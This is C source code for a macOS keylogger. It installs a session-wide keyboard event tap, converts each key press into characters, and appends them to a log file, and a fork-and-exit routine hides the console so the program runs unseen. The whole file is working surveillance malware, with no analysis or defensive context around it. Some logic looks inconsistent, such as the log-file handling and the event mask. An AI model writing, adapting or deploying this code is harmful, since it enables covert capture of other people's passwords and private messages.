#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ApplicationServices/ApplicationServices.h> // For CGEvent APIs
#include <time.h>
#include <Carbon/Carbon.h>

#include "util.h"

#define DEBOUNCE_DELAY 0.025 // Adjust as needed (in seconds)

void hideConsole() {
    int pid = fork();
    if (pid > 0) {
        exit(0);
    }
}

FILE *logfile;
char *logfileLocation;


CGKeyCode previousKeyCode = 0;
time_t previousKeyTime = 0;

// Structure to track key state and debounce time
struct KeyState {
    bool down;
    bool lastState; // Added field to track the previous state
    time_t lastEventTime;
};

// Map key codes to debounce state
struct KeyState keyStates[256] = {0};

const char *convertKeyCode(int keyCode, bool shift, bool caps) {
    switch ((int) keyCode) {
        case 0:   return shift || caps ? "A" : "a";
        case 1:   return shift || caps ? "S" : "s";
        case 2:   return shift || caps ? "D" : "d";
        case 3:   return shift || caps ? "F" : "f";
        case 4:   return shift || caps ? "H" : "h";
        case 5:   return shift || caps ? "G" : "g";
        case 6:   return shift || caps ? "Z" : "z";
        case 7:   return shift || caps ? "X" : "x";
        case 8:   return shift || caps ? "C" : "c";
        case 9:   return shift || caps ? "V" : "v";
        case 11:  return shift || caps ? "B" : "b";
        case 12:  return shift || caps ? "Q" : "q";
        case 13:  return shift || caps ? "W" : "w";
        case 14:  return shift || caps ? "E" : "e";
        case 15:  return shift || caps ? "R" : "r";
        case 16:  return shift || caps ? "Y" : "y";
        case 17:  return shift || caps ? "T" : "t";
        case 18:  return shift ? "!" : "1";
        case 19:  return shift ? "@" : "2";
        case 20:  return shift ? "#" : "3";
        case 21:  return shift ? "$" : "4";
        case 22:  return shift ? "^" : "6";
        case 23:  return shift ? "%" : "5";
        case 24:  return shift ? "+" : "=";
        case 25:  return shift ? "(" : "9";
        case 26:  return shift ? "&" : "7";
        case 27:  return shift ? "_" : "-";
        case 28:  return shift ? "*" : "8";
        case 29:  return shift ? ")" : "0";
        case 30:  return shift ? "}" : "]";
        case 31:  return shift || caps ? "O" : "o";
        case 32:  return shift || caps ? "U" : "u";
        case 33:  return shift ? "{" : "[";
        case 34:  return shift || caps ? "I" : "i";
        case 35:  return shift || caps ? "P" : "p";
        case 37:  return shift || caps ? "L" : "l";
        case 38:  return shift || caps ? "J" : "j";
        case 39:  return shift ? "\"" : "'";
        case 40:  return shift || caps ? "K" : "k";
        case 41:  return shift ? ":" : ";";
        case 42:  return shift ? "|" : "\\";
        case 43:  return shift ? "<" : ",";
        case 44:  return shift ? "?" : "/";
        case 45:  return shift || caps ? "N" : "n";
        case 46:  return shift || caps ? "M" : "m";
        case 47:  return shift ? ">" : ".";
        case 50:  return shift ? "~" : "`";
        case 65:  return "[decimal]";
        case 67:  return "[asterisk]";
        case 69:  return "[plus]";
        case 71:  return "[clear]";
        case 75:  return "[divide]";
        case 76:  return "[enter]";
        case 78:  return "[hyphen]";
        case 81:  return "[equals]";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "[return]";
        case 48:  return "[tab]";
        case 49:  return " ";
        case 51:  return "[del]";
        case 53:  return "[esc]";
        case 54:  return "[right-cmd]";
        case 55:  return "[left-cmd]";
        case 56:  return "[left-shift]";
        case 57:  return "[caps]";
        case 58:  return "[left-option]";
        case 59:  return "[left-ctrl]";
        case 60:  return "[right-shift]";
        case 61:  return "[right-option]";
        case 62:  return "[right-ctrl]";
        case 63:  return "[fn]";
        case 64:  return "[f17]";
        case 72:  return "[volup]";
        case 73:  return "[voldown]";
        case 74:  return "[mute]";
        case 79:  return "[f18]";
        case 80:  return "[f19]";
        case 90:  return "[f20]";
        case 96:  return "[f5]";
        case 97:  return "[f6]";
        case 98:  return "[f7]";
        case 99:  return "[f3]";
        case 100: return "[f8]";
        case 101: return "[f9]";
        case 103: return "[f11]";
        case 105: return "[f13]";
        case 106: return "[f16]";
        case 107: return "[f14]";
        case 109: return "[f10]";
        case 111: return "[f12]";
        case 113: return "[f15]";
        case 114: return "[help]";
        case 115: return "[home]";
        case 116: return "[pgup]";
        case 117: return "[fwddel]";
        case 118: return "[f4]";
        case 119: return "[end]";
        case 120: return "[f2]";
        case 121: return "[pgdown]";
        case 122: return "[f1]";
        case 123: return "[left]";
        case 124: return "[right]";
        case 125: return "[down]";
        case 126: return "[up]";
    }
    return "[unknown]";
}




bool isModifierKey(CGKeyCode keyCode) {
    return (keyCode == kVK_Shift || keyCode == kVK_RightShift ||
            keyCode == kVK_Control || keyCode == kVK_RightControl ||
            keyCode == kVK_Command || keyCode == kVK_RightCommand ||
            keyCode == kVK_Option || keyCode == kVK_RightOption ||
            keyCode == kVK_CapsLock);
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventKeyUp) {
        return event;
    }

    CGEventFlags flags = CGEventGetFlags(event);
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Check if the key event is a key up event
    bool keyUpEvent = (type == kCGEventKeyUp);

    // Update key state
    keyStates[keyCode].down = !keyUpEvent;

    // Print the human-readable key to the logfile if it's not a modifier key and it was just pressed
    if (!isModifierKey(keyCode) && keyStates[keyCode].down && keyCode != previousKeyCode) {
        bool shift = flags & kCGEventFlagMaskShift;
        bool caps = flags & kCGEventFlagMaskAlphaShift;

        // Handle Caps Lock
        if ((keyCode == kVK_CapsLock) && (flags & kCGEventFlagMaskAlphaShift)) {
            caps = !caps; // Toggle caps if Caps Lock is pressed
        }

        fprintf(logfile, "%s", convertKeyCode(keyCode, shift, caps));
        fflush(logfile);

        // Update previous key code
        previousKeyCode = keyCode;
    }

    return event;
}


int script_macos() {
    hideConsole();

    // Reset previousKeyCode at the beginning of each keylogging session
    previousKeyCode = 0;

    if(createLog(logfile) == 1)return 1;


    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        return 2;
    }

    logfileLocation = logFileName;

    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    CFMachPortRef eventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        fclose(logfile);
        return 10;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    fprintf(logfile , "\n\nKeylogging has begun.\n");
    fflush(logfile);
    fflush(stdout);
    CFRunLoopRun();

    fclose(logfile);
    return 0;
}